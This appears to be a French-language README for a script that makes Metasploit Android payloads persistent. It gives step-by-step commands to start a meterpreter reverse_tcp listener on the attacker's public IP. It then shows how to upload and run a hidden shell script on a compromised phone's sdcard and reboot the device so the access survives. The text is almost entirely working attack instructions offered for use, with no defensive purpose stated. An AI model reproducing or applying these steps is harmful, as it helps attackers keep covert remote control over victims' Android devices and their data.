# **<center>Msf Persistance Android</center>**


**INTRODUCTION**

*Script qui permet d'ajouter la persistance aux payload android avec msf*


**UTILISATION**

1 - Mettez le script msf-persistance-android.sh dans le dossier root et renommez le .sh

2 - Ouvrir MSF

    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set lhost VOTRE IP PUBLIC
    set lport LE PORT DE VOTRE CHOIX
    exploit

3 - Copier / coller dans un terminal en console msf avec une session android :

    cd /
    cd sdcard
    upload ~/.sh
    shell
    cd /
    cd sdcard
    sh .sh
    reboot
    exit


**LICENSE**

[![GPLv3+](http://gplv3.fsf.org/gplv3-127x51.png)](https://github.com/oda-alexandre/msf-persistance-android/blob/master/LICENSE)
